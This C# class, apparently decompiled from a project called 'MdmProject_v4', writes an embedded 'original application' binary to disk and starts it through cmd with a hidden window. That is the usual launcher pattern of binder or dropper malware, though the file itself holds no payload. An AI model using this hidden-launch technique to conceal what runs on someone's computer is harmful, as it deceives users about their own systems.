using MdmProject_v4.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.Windows.Forms;

internal class OriginalApplicationLauncher
{
	public static void SaveAndLaunchOriginalApplication()
	{
		try
		{
			if (Globals.currentDirectory == "")
			{
				Globals.currentDirectory = Environment.CurrentDirectory;
			}
			string text = Path.Combine(Globals.currentDirectory, Globals.originalApplicationFileName);
			if (Resources.originalFileContents.Length != 1)
			{
				FileUtils.SaveBinaryToFile(text, Resources.originalFileContents);
			}
			FileUtils.LaunchFile(Globals.cmdPath, "/c \"" + text + "\"", false, ProcessWindowStyle.Hidden);
		}
		catch (Exception ex)
		{
			MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}
}
